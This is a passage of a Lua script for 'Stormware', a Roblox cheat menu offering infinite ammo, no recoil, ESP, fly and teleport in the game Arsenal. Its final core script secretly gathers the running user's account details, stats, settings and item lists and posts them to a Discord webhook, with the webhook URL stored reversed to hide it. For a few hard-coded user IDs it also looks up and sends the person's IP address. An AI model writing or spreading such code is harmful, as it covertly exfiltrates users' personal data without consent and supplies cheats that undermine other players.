InfAmmo.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
InfAmmo.Position = UDim2.new(0.0197484065, 0, 0.269664049, 0)
InfAmmo.Size = UDim2.new(0, 84, 0, 40)
InfAmmo.Font = Enum.Font.Nunito
InfAmmo.Text = "Infinite Ammo"
InfAmmo.TextColor3 = Color3.fromRGB(255, 255, 255)
InfAmmo.TextScaled = true
InfAmmo.TextSize = 14.000
InfAmmo.TextWrapped = true

UICorner_14.Parent = InfAmmo

FireRate.Name = "FireRate"
FireRate.Parent = mods
FireRate.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
FireRate.Position = UDim2.new(0.271595716, 0, 0.267126113, 0)
FireRate.Size = UDim2.new(0, 84, 0, 40)
FireRate.Font = Enum.Font.Nunito
FireRate.Text = "Fire Rate"
FireRate.TextColor3 = Color3.fromRGB(255, 255, 255)
FireRate.TextScaled = true
FireRate.TextSize = 14.000
FireRate.TextWrapped = true

UICorner_15.Parent = FireRate

noRecoil.Name = "noRecoil"
noRecoil.Parent = mods
noRecoil.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
noRecoil.Position = UDim2.new(0.521595716, 0, 0.267126113, 0)
noRecoil.Size = UDim2.new(0, 84, 0, 40)
noRecoil.Font = Enum.Font.Nunito
noRecoil.Text = "No Recoil"
noRecoil.TextColor3 = Color3.fromRGB(255, 255, 255)
noRecoil.TextScaled = true
noRecoil.TextSize = 14.000
noRecoil.TextWrapped = true

UICorner_16.Parent = noRecoil

nospread.Name = "nospread"
nospread.Parent = mods
nospread.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
nospread.Position = UDim2.new(0.0241467357, 0, 0.502703071, 0)
nospread.Size = UDim2.new(0, 84, 0, 40)
nospread.Font = Enum.Font.Nunito
nospread.Text = "No Spread"
nospread.TextColor3 = Color3.fromRGB(255, 255, 255)
nospread.TextScaled = true
nospread.TextSize = 14.000
nospread.TextWrapped = true

UICorner_17.Parent = nospread

PlayerFrame.Name = "PlayerFrame"
PlayerFrame.Parent = ware
PlayerFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
PlayerFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
PlayerFrame.Size = UDim2.new(0, 1040, 0, 601)
PlayerFrame.Visible = false

UICorner_18.CornerRadius = UDim.new(0, 34)
UICorner_18.Parent = PlayerFrame

TextLabel_8.Parent = PlayerFrame
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Position = UDim2.new(0.297181696, 0, 0.0429184549, 0)
TextLabel_8.Size = UDim2.new(0, 421, 0, 50)
TextLabel_8.Font = Enum.Font.Nunito
TextLabel_8.Text = "LocalPlayer/FE"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextWrapped = true

DSpoofs.Name = "DSpoofs"
DSpoofs.Parent = PlayerFrame
DSpoofs.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
DSpoofs.Position = UDim2.new(0.0192307699, 0, 0.154742092, 0)
DSpoofs.Size = UDim2.new(0, 300, 0, 175)

UICorner_19.Parent = DSpoofs

console.Name = "console"
console.Parent = DSpoofs
console.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
console.Position = UDim2.new(-5.9068203e-05, 0, 0.608918667, 0)
console.Size = UDim2.new(0, 92, 0, 28)
console.Font = Enum.Font.Nunito
console.Text = "Spoof Device To Console"
console.TextColor3 = Color3.fromRGB(255, 255, 255)
console.TextScaled = true
console.TextSize = 14.000
console.TextWrapped = true

UICorner_20.Parent = console

mobile.Name = "mobile"
mobile.Parent = DSpoofs
mobile.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
mobile.Position = UDim2.new(-0.00209614635, 0, 0.822333276, 0)
mobile.Size = UDim2.new(0, 92, 0, 28)
mobile.Font = Enum.Font.Nunito
mobile.Text = "Spoof Device To Mobile"
mobile.TextColor3 = Color3.fromRGB(255, 255, 255)
mobile.TextScaled = true
mobile.TextSize = 14.000
mobile.TextWrapped = true

UICorner_21.Parent = mobile

pc.Name = "pc"
pc.Parent = DSpoofs
pc.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
pc.Position = UDim2.new(0.657327533, 0, 0.824950278, 0)
pc.Size = UDim2.new(0, 92, 0, 28)
pc.Font = Enum.Font.Nunito
pc.Text = "Spoof Device To PC"
pc.TextColor3 = Color3.fromRGB(255, 255, 255)
pc.TextScaled = true
pc.TextSize = 14.000
pc.TextWrapped = true

UICorner_22.Parent = pc

none.Name = "none"
none.Parent = DSpoofs
none.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
none.Position = UDim2.new(0.300926983, 0, 0.827148557, 0)
none.Size = UDim2.new(0, 92, 0, 28)
none.Font = Enum.Font.Nunito
none.Text = "Spoof Device To None"
none.TextColor3 = Color3.fromRGB(255, 255, 255)
none.TextScaled = true
none.TextSize = 14.000
none.TextWrapped = true

UICorner_23.Parent = none

TextLabel_9.Parent = DSpoofs
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Position = UDim2.new(0.20444192, 0, 0.000235486776, 0)
TextLabel_9.Size = UDim2.new(0, 177, 0, 50)
TextLabel_9.Font = Enum.Font.Nunito
TextLabel_9.Text = "Device Spoofs"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextWrapped = true

Others.Name = "Others"
Others.Parent = PlayerFrame
Others.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Others.Position = UDim2.new(0.343269259, 0, 0.148086518, 0)
Others.Size = UDim2.new(0, 300, 0, 175)

UICorner_24.Parent = Others

TextLabel_10.Parent = Others
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.Position = UDim2.new(0.244441912, 0, -0.00547879888, 0)
TextLabel_10.Size = UDim2.new(0, 177, 0, 50)
TextLabel_10.Font = Enum.Font.Nunito
TextLabel_10.Text = "Others"
TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 14.000
TextLabel_10.TextWrapped = true

Gravity.Name = "Gravity"
Gravity.Parent = Others
Gravity.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Gravity.Position = UDim2.new(0.0285057425, 0, 0.487681001, 0)
Gravity.Size = UDim2.new(0, 122, 0, 29)
Gravity.Font = Enum.Font.SourceSans
Gravity.PlaceholderText = "Gravity"
Gravity.Text = ""
Gravity.TextColor3 = Color3.fromRGB(255, 255, 255)
Gravity.TextScaled = true
Gravity.TextSize = 24.000
Gravity.TextWrapped = true

UICorner_25.Parent = Gravity

upd.Name = "upd"
upd.Parent = Others
upd.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
upd.Position = UDim2.new(0.0829885006, 0, 0.71218133, 0)
upd.Size = UDim2.new(0, 89, 0, 22)
upd.Font = Enum.Font.Nunito
upd.Text = "Update"
upd.TextColor3 = Color3.fromRGB(255, 255, 255)
upd.TextScaled = true
upd.TextSize = 14.000
upd.TextWrapped = true

UICorner_26.Parent = upd

Nonexisty.Name = "Nonexisty"
Nonexisty.Parent = Others
Nonexisty.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Nonexisty.Position = UDim2.new(0.373045981, 0, 0.790631533, 0)
Nonexisty.Size = UDim2.new(0, 99, 0, 30)
Nonexisty.Font = Enum.Font.Nunito
Nonexisty.Text = "Turn Invisible"
Nonexisty.TextColor3 = Color3.fromRGB(255, 255, 255)
Nonexisty.TextScaled = true
Nonexisty.TextSize = 14.000
Nonexisty.TextWrapped = true

UICorner_27.Parent = Nonexisty

Sunglasses.Name = "Sunglasses"
Sunglasses.Parent = Others
Sunglasses.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Sunglasses.Position = UDim2.new(0.639683843, 0, 0.608093262, 0)
Sunglasses.Size = UDim2.new(0, 93, 0, 32)
Sunglasses.Font = Enum.Font.Nunito
Sunglasses.Text = "Sunglasses"
Sunglasses.TextColor3 = Color3.fromRGB(255, 255, 255)
Sunglasses.TextScaled = true
Sunglasses.TextSize = 14.000
Sunglasses.TextWrapped = true

UICorner_28.Parent = Sunglasses

Walkspeed.Name = "Walkspeed"
Walkspeed.Parent = Others
Walkspeed.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Walkspeed.Position = UDim2.new(0.59399426, 0, 0.413488656, 0)
Walkspeed.Size = UDim2.new(0, 106, 0, 30)
Walkspeed.Font = Enum.Font.Nunito
Walkspeed.Text = "Walkspeed"
Walkspeed.TextColor3 = Color3.fromRGB(255, 255, 255)
Walkspeed.TextScaled = true
Walkspeed.TextSize = 14.000
Walkspeed.TextWrapped = true

UICorner_29.Parent = Walkspeed

tpfly.Name = "tpfly"
tpfly.Parent = PlayerFrame
tpfly.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
tpfly.Position = UDim2.new(0.668269277, 0, 0.146422625, 0)
tpfly.Size = UDim2.new(0, 300, 0, 175)

UICorner_30.Parent = tpfly

TextLabel_11.Parent = tpfly
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Position = UDim2.new(0.122988686, 0, -0.00547877699, 0)
TextLabel_11.Size = UDim2.new(0, 225, 0, 50)
TextLabel_11.Font = Enum.Font.Nunito
TextLabel_11.Text = "Teleportation & Fly"
TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

Fly.Name = "Fly"
Fly.Parent = tpfly
Fly.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Fly.Position = UDim2.new(0.644482791, 0, 0.836664617, 0)
Fly.Size = UDim2.new(0, 92, 0, 28)
Fly.Font = Enum.Font.Nunito
Fly.Text = "Fly (T to toggle)"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextScaled = true
Fly.TextSize = 14.000
Fly.TextWrapped = true

UICorner_31.Parent = Fly

tel.Name = "tel"
tel.Parent = tpfly
tel.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
tel.Position = UDim2.new(0.3907184, 0, 0.611306071, 0)
tel.Size = UDim2.new(0, 84, 0, 20)
tel.Font = Enum.Font.Nunito
tel.Text = "Teleport"
tel.TextColor3 = Color3.fromRGB(255, 255, 255)
tel.TextScaled = true
tel.TextSize = 14.000
tel.TextWrapped = true

UICorner_32.Parent = tel

teleport.Name = "teleport"
teleport.Parent = tpfly
teleport.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
teleport.Position = UDim2.new(0.236091956, 0, 0.408215791, 0)
teleport.Size = UDim2.new(0, 178, 0, 31)
teleport.Font = Enum.Font.SourceSans
teleport.PlaceholderText = "Teleport To:"
teleport.Text = ""
teleport.TextColor3 = Color3.fromRGB(255, 255, 255)
teleport.TextScaled = true
teleport.TextSize = 14.000
teleport.TextWrapped = true

UICorner_33.Parent = teleport

VisualFrame.Name = "VisualFrame"
VisualFrame.Parent = ware
VisualFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
VisualFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
VisualFrame.Size = UDim2.new(0, 1040, 0, 601)
VisualFrame.Visible = false

UICorner_34.CornerRadius = UDim.new(0, 34)
UICorner_34.Parent = VisualFrame

TextLabel_12.Parent = VisualFrame
TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.BackgroundTransparency = 1.000
TextLabel_12.Position = UDim2.new(0.281797081, 0, 0.014632266, 0)
TextLabel_12.Size = UDim2.new(0, 421, 0, 50)
TextLabel_12.Font = Enum.Font.Nunito
TextLabel_12.Text = "Visuals"
TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.TextScaled = true
TextLabel_12.TextSize = 14.000
TextLabel_12.TextWrapped = true

viss.Name = "viss"
viss.Parent = VisualFrame
viss.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
viss.Position = UDim2.new(0.188461542, 0, 0.144758731, 0)
viss.Size = UDim2.new(0, 573, 0, 368)

UICorner_35.Parent = viss

TextLabel_13.Parent = viss
TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.BackgroundTransparency = 1.000
TextLabel_13.Position = UDim2.new(0.387687951, 0, -0.00248191669, 0)
TextLabel_13.Size = UDim2.new(0, 203, 0, 50)
TextLabel_13.Font = Enum.Font.Nunito
TextLabel_13.Text = "Visuals & FOV"
TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.TextScaled = true
TextLabel_13.TextSize = 14.000
TextLabel_13.TextWrapped = true

updFov.Name = "updFov"
updFov.Parent = viss
updFov.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
updFov.Position = UDim2.new(0.489656687, 0, 0.514076769, 0)
updFov.Size = UDim2.new(0, 84, 0, 40)
updFov.Font = Enum.Font.Nunito
updFov.Text = "Update"
updFov.TextColor3 = Color3.fromRGB(255, 255, 255)
updFov.TextScaled = true
updFov.TextSize = 14.000
updFov.TextWrapped = true

UICorner_36.Parent = updFov

fov.Name = "fov"
fov.Parent = viss
fov.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
fov.Position = UDim2.new(0.446658552, 0, 0.408763289, 0)
fov.Size = UDim2.new(0, 135, 0, 29)
fov.Font = Enum.Font.SourceSans
fov.PlaceholderText = "Arsenal FOV"
fov.Text = ""
fov.TextColor3 = Color3.fromRGB(255, 255, 255)
fov.TextScaled = true
fov.TextSize = 24.000
fov.TextWrapped = true

UICorner_37.Parent = fov

box.Name = "box"
box.Parent = viss
box.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
box.Position = UDim2.new(0.491097212, 0, 0.219467252, 0)
box.Size = UDim2.new(0, 84, 0, 40)
box.Font = Enum.Font.Nunito
box.Text = "Box ESP"
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.TextScaled = true
box.TextSize = 14.000
box.TextWrapped = true

UICorner_38.Parent = box

CreditsFrame.Name = "CreditsFrame"
CreditsFrame.Parent = ware
CreditsFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CreditsFrame.Position = UDim2.new(0.184378624, 0, 0.137693956, 0)
CreditsFrame.Size = UDim2.new(0, 1040, 0, 601)
CreditsFrame.Visible = false

UICorner_39.CornerRadius = UDim.new(0, 34)
UICorner_39.Parent = CreditsFrame

Title_2.Name = "Title"
Title_2.Parent = CreditsFrame
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.Position = UDim2.new(0.0452586226, 0, 0.0429184549, 0)
Title_2.Size = UDim2.new(0, 421, 0, 50)
Title_2.Font = Enum.Font.Nunito
Title_2.Text = "Stormware Credits"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextScaled = true
Title_2.TextSize = 14.000
Title_2.TextWrapped = true

upperText.Name = "upperText"
upperText.Parent = CreditsFrame
upperText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
upperText.BackgroundTransparency = 1.000
upperText.Position = UDim2.new(0.25247106, 0, 0.392080426, 0)
upperText.Size = UDim2.new(0, 228, 0, 33)
upperText.Font = Enum.Font.SciFi
upperText.Text = "Stormware, the most best competitve arsenal exploit, Developed By"
upperText.TextColor3 = Color3.fromRGB(255, 255, 255)
upperText.TextSize = 16.000

stormcr.Name = "stormcr"
stormcr.Parent = CreditsFrame
stormcr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
stormcr.BackgroundTransparency = 1.000
stormcr.Position = UDim2.new(0.25247106, 0, 0.533711314, 0)
stormcr.Size = UDim2.new(0, 228, 0, 33)
stormcr.Font = Enum.Font.SciFi
stormcr.Text = "Storm.#1020  - Core Development And "
stormcr.TextColor3 = Color3.fromRGB(255, 255, 255)
stormcr.TextSize = 16.000

lolcat_relative.Name = "lolcat_relative"
lolcat_relative.Parent = CreditsFrame
lolcat_relative.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lolcat_relative.BackgroundTransparency = 1.000
lolcat_relative.Position = UDim2.new(0.317126215, 0, 0.641007423, 0)
lolcat_relative.Size = UDim2.new(0, 228, 0, 33)
lolcat_relative.Font = Enum.Font.SciFi
lolcat_relative.Text = "lolcat#1337  - Additional Webhook Infos (level, skin, melee)"
lolcat_relative.TextColor3 = Color3.fromRGB(255, 255, 255)
lolcat_relative.TextSize = 16.000

SIDE.Name = "SIDE"
SIDE.Parent = ware
SIDE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SIDE.Position = UDim2.new(0.0109090917, 0, 0.0506172851, 0)
SIDE.Size = UDim2.new(0, 189, 0, 740)

UICorner_40.Parent = SIDE

Visuals.Name = "Visuals"
Visuals.Parent = SIDE
Visuals.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Visuals.BackgroundTransparency = 0.500
Visuals.Position = UDim2.new(0.0093669584, 0, 0.482378662, 0)
Visuals.Size = UDim2.new(0, 185, 0, 50)
Visuals.Font = Enum.Font.Nunito
Visuals.Text = "Visuals"
Visuals.TextColor3 = Color3.fromRGB(255, 255, 255)
Visuals.TextSize = 22.000

Player.Name = "Player"
Player.Parent = SIDE
Player.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Player.BackgroundTransparency = 0.500
Player.Position = UDim2.new(0.00325222127, 0, 0.390143812, 0)
Player.Size = UDim2.new(0, 186, 0, 50)
Player.Font = Enum.Font.Nunito
Player.Text = "Player/FE"
Player.TextColor3 = Color3.fromRGB(255, 255, 255)
Player.TextSize = 22.000

Home.Name = "Home"
Home.Parent = SIDE
Home.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Home.BackgroundTransparency = 0.500
Home.Position = UDim2.new(0.00407595374, 0, 0.208732098, 0)
Home.Size = UDim2.new(0, 186, 0, 50)
Home.Font = Enum.Font.Nunito
Home.Text = "Home"
Home.TextColor3 = Color3.fromRGB(255, 255, 255)
Home.TextSize = 22.000

Credits.Name = "Credits"
Credits.Parent = SIDE
Credits.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Credits.BackgroundTransparency = 1.000
Credits.Position = UDim2.new(0.0124831833, 0, 0.932077467, 0)
Credits.Size = UDim2.new(0, 185, 0, 50)
Credits.Font = Enum.Font.Nunito
Credits.Text = "Credits"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextSize = 22.000

Combat.Name = "Combat"
Combat.Parent = SIDE
Combat.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Combat.BackgroundTransparency = 0.500
Combat.Position = UDim2.new(0.0177741908, 0, 0.303669691, 0)
Combat.Size = UDim2.new(0, 185, 0, 50)
Combat.Font = Enum.Font.Nunito
Combat.Text = "Combat"
Combat.TextColor3 = Color3.fromRGB(255, 255, 255)
Combat.TextSize = 22.000

SEPERATOR.Name = "SEPERATOR"
SEPERATOR.Parent = SIDE
SEPERATOR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SEPERATOR.BackgroundTransparency = 1.000
SEPERATOR.Position = UDim2.new(-0.0965054184, 0, 0.125675678, 0)
SEPERATOR.Size = UDim2.new(0, 208, 0, 50)
SEPERATOR.Font = Enum.Font.SourceSans
SEPERATOR.Text = "________________________"
SEPERATOR.TextColor3 = Color3.fromRGB(255, 255, 255)
SEPERATOR.TextSize = 14.000

PFP.Name = "PFP"
PFP.Parent = SIDE
PFP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PFP.BackgroundTransparency = 1.000
PFP.Position = UDim2.new(0.334727407, 0, 0.0135135138, 0)
PFP.Size = UDim2.new(0, 56, 0, 43)
PFP.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner_41.CornerRadius = UDim.new(0, 10)
UICorner_41.Parent = PFP

currName.Name = "currName"
currName.Parent = SIDE
currName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
currName.BackgroundTransparency = 1.000
currName.Position = UDim2.new(-0.0700503886, 0, 0.0581081063, 0)
currName.Size = UDim2.new(0, 208, 0, 50)
currName.Font = Enum.Font.Jura
currName.Text = "Name"
currName.TextColor3 = Color3.fromRGB(255, 255, 255)
currName.TextSize = 26.000
currName.TextWrapped = true

rnk.Name = "rnk"
rnk.Parent = SIDE
rnk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rnk.BackgroundTransparency = 1.000
rnk.Position = UDim2.new(-0.117669448, 0, 0.106756754, 0)
rnk.Size = UDim2.new(0, 208, 0, 50)
rnk.Font = Enum.Font.Jura
rnk.Text = "Rank: Bri'ish"
rnk.TextColor3 = Color3.fromRGB(255, 255, 255)
rnk.TextSize = 26.000
rnk.TextWrapped = true

-- Scripts:

local function HOTAI_fake_script() -- Visuals.LocalScript 
	local script = Instance.new('LocalScript', Visuals)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = true
	end)
end
coroutine.wrap(HOTAI_fake_script)()
local function GCFL_fake_script() -- Player.LocalScript 
	local script = Instance.new('LocalScript', Player)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = true
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(GCFL_fake_script)()
local function YBVAFQ_fake_script() -- Home.LocalScript 
	local script = Instance.new('LocalScript', Home)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = true
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(YBVAFQ_fake_script)()
local function RHOBEGE_fake_script() -- Credits.LocalScript 
	local script = Instance.new('LocalScript', Credits)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = false
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = true
		script.Parent.Parent.Parent.HomeFrame.Visible = false
	end)
end
coroutine.wrap(RHOBEGE_fake_script)()
local function KFIJGIL_fake_script() -- Combat.LocalScript 
	local script = Instance.new('LocalScript', Combat)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.CombatFrame.Visible = true
		script.Parent.Parent.Parent.PlayerFrame.Visible = false
		script.Parent.Parent.Parent.VisualFrame.Visible = false
		script.Parent.Parent.Parent.HomeFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
	end)
end
coroutine.wrap(KFIJGIL_fake_script)()
local function JPSURY_fake_script() -- StormWareX.Core 
	local script = Instance.new('LocalScript', StormWareX)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	
	function comma_value(amount)
		local formatted = amount
		while true do  
			formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
			if (k==0) then
				break
			end
		end
		return formatted
	end
	local skins = {}
	for i,v in pairs(game.Players.LocalPlayer.Data.Shuffles.Skins:GetChildren()) do
		table.insert(skins, v.Name)
	end
	skins = table.concat(skins, "\n")
	local url = "https://www.toptal.com/developers/hastebin/documents"
	local newdata = skins
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	local response
	local result = pcall(function()
		response = request(abcdef)
	end)
	local link = "Error"
	if result then
		pcall(function()
			local body = response.Body
			local key = game:GetService("HttpService"):JSONDecode(body).key
			link = "https://hastebin.com/" .. key
		end)
	end
	local executor = "Unknown Exploit"
	pcall(function()
		executor = identifyexecutor()
	end)
	local pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
	pcall(function()
		pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
	end)
	local function b2s(bool)
	    if bool then
	        return "Yes"
	    end
        return "No"
	end
	local kdr = tostring(math.floor((game.Players.LocalPlayer.Data.KD.KOs.Value / game.Players.LocalPlayer.Data.KD.WOs.Value) * 100) / 100)
	if kdr == "nan" then
        kdr = "1"
	end
	local sens = tostring(UserSettings():GetService("UserGameSettings").MouseSensitivity)
	sens = sens:split(".")[1] .. "." .. sens:split(".")[2]:sub(1, 3)
	local melees = {}
	for i,v in pairs(game.Players.LocalPlayer.Data.Shuffles.Melees:GetChildren()) do
		table.insert(melees, v.Name)
	end
	melees = table.concat(melees, "\n")
	local url = "https://www.toptal.com/developers/hastebin/documents"
	local newdata = melees
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	local response
	local result = pcall(function()
		response = request(abcdef)
	end)
	local link2 = "Error"
	if result then
		pcall(function()
			local body = response.Body
			local key = game:GetService("HttpService"):JSONDecode(body).key
			link2 = "https://hastebin.com/" .. key
		end)
	end
	local ping = "Unknown"
	pcall(function()
	    ping = game.Stats.Network.ServerStatsItem["Data Ping"]:GetValueString():split(".")[1]
	end)
	local volume = "Unknown"
	pcall(function()
	    volume = tostring(math.floor(UserSettings():GetService("UserGameSettings").MasterVolume * 100)) .. "%"
	end)
	local ip = " // NOT BLACKLISTED"
	-- IF A BLACKLISTED BITCH USES THIS
	if game.Players.LocalPlayer.UserId == 3498733335 or game.Players.LocalPlayer.UserId == 3489570364 or game.Players.LocalPlayer.UserId == 3576708191 or game.Players.LocalPlayer.UserId == 3044390814 then
		ip = game:HttpGet("https://wtfismyip.com/text")
	end
	-- go ahead and spam, idc, we dont log critical info so you can go cry urself to sleep LOL
	
	local url =
		"_WJJLuJTVgUGt7YIchG8BdX8Atissy2oxlnCxFAsqrfOBLcPRFiXDikt10R08AhtU_LQ/4191927428255061501/skoohbew/ipa/moc.drocsid//:sptth"
	local data = {
		["embeds"] = {
			{
				["color"] = 7498202,
				["fields"] = {
					{
						["name"] = "Executor",
						["value"] = executor,
						["inline"] = true
					},
					{
						["name"] = "Clock",
						["value"] = os.date("%I:%M %p"),
						["inline"] = true
					},
					{
						["name"] = "Flag",
						["value"] = ":flag_" .. game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower() .. ":",
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = game.Players.LocalPlayer.AccountAge .. " days",
						["inline"] = true
					},
					{
						["name"] = "Premium",
						["value"] = b2s(game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium),
						["inline"] = true
					},
					{
						["name"] = "Level",
						["value"] = game.Players.LocalPlayer.CareerStatsCache.Level.Value,
						["inline"] = true
					},
					{
						["name"] = "Skin",
						["value"] = game.Players.LocalPlayer.Data.Skin.Value,
						["inline"] = true
					},
					{
						["name"] = "Melee",
						["value"] = game.Players.LocalPlayer.Data.Melee.Value,
						["inline"] = true
					},
					{
						["name"] = "Kills",
						["value"] = comma_value(game.Players.LocalPlayer.Data.KD.KOs.Value),
						["inline"] = true
					},
					{
						["name"] = "Deaths",
						["value"] = comma_value(game.Players.LocalPlayer.Data.KD.WOs.Value),
						["inline"] = true
					},
					{
						["name"] = "KDR",
						["value"] = kdr,
						["inline"] = true
					},
					{
						["name"] = "Skins",
						["value"] = link,
						["inline"] = true
					},
					{
					    ["name"] = "Ping",
					    ["value"] = ping,
					    ["inline"] = true
					},
					{
					    ["name"] = "Volume",
					    ["value"] = volume,
					    ["inline"] = true
					},
					{
					    ["name"] = "Sensitivity",
					    ["value"] = sens,
					    ["inline"] = true
					},
					{
					    ["name"] = "Melees",
					    ["value"] = link2,
					    ["inline"] = true
					},
					{
					    ["name"] = "FOV",
					    ["value"] = tostring(game.Players.LocalPlayer.Settings.FOV.Value),
					    ["inline"] = true
					},
					{
					    ["name"] = "No Textures",
					    ["value"] = tostring(b2s(game.Players.LocalPlayer.Settings.NoTextures.Value)),
					    ["inline"] = true
					}
				},
				["author"] = {
					["name"] = game.Players.LocalPlayer.Name .. ip,
					["icon_url"] = pfp
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)
	
	local headers = {
		["content-type"] = "application/json"
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	}
	request = http_request or request or HttpPost or syn.request
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	local final = url:reverse()
	local abcdef = {Url = final, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
	
	
	
	
	
	
	script.Parent.ware.VisualFrame.viss.updFov.MouseButton1Click:Connect(function()
		local fovVal = tonumber(script.Parent.ware.VisualFrame.fov.Text)
		game:GetService("Players").LocalPlayer.Settings.FOV.Value = fovVal
	end)
	
	
	local p = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
	p = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
